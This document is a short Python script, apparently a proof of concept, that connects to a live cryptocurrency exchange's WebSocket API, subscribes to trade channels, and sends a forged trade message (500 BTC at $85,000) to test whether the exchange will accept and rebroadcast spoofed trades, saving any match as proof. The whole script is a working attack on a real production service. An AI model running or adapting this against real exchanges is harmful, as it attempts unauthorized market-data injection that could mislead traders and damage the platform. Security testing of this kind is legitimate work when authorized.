import asyncio
import websockets
import json
from datetime import datetime
import time

async def test_and_verify_trades():
    """Complete trade spoofing test with auto-verification"""
    try:
        print("🔵 [1/6] Connecting to WebSocket...")
        async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
            
            # Subscribe to public trades
            await ws.send(json.dumps({
                "op": "subscribe",
                "args": ["trades:BTC-USDT"]
            }))
            print("🟢 [2/6] Subscribed to trades channel")
            
            # Verify subscription
            response = await ws.recv()
            print(f"🔵 [3/6] Server response: {response}")
            
            # Subscribe to private trades (for verification)
            await ws.send(json.dumps({
                "op": "subscribe", 
                "args": ["user.trade:BTC-USDT"]
            }))
            print("🟢 [4/6] Subscribed to private trade feed")
            
            # Inject spoofed trade
            spoofed_trade = {
                "op": "update",
                "args": [{
                    "symbol": "BTC-USDT",
                    "price": "85000.00",
                    "quantity": "500",
                    "side": "buy",
                    "timestamp": int(time.time() * 1000)
                }]
            }
            await ws.send(json.dumps(spoofed_trade))
            print("🟡 [5/6] Injected fake trade: 500 BTC @ $85K")
            
            # Verification phase
            print("🕒 [6/6] Monitoring private feed (timeout: 30s)...")
            try:
                start_time = time.time()
                while time.time() - start_time < 30:  # 30s monitoring window
                    msg = await asyncio.wait_for(ws.recv(), timeout=10)
                    if "85000.00" in msg:
                        print(f"🔴 VULNERABILITY CONFIRMED IN PRIVATE FEED:\n{msg}")
                        with open("mexc_private_poc.txt", "w") as f:
                            f.write(f"Private Feed Proof - {datetime.now()}\n")
                            f.write(f"Injected: {json.dumps(spoofed_trade, indent=2)}\n")
                            f.write(f"Received: {msg}\n")
                        return
                print("🟢 No spoofed trade detected in private feed")
            except asyncio.TimeoutError:
                print("🟠 Verification timeout - check account history manually")
                
    except Exception as e:
        print(f"🔴 Critical error: {str(e)}")

asyncio.run(test_and_verify_trades())
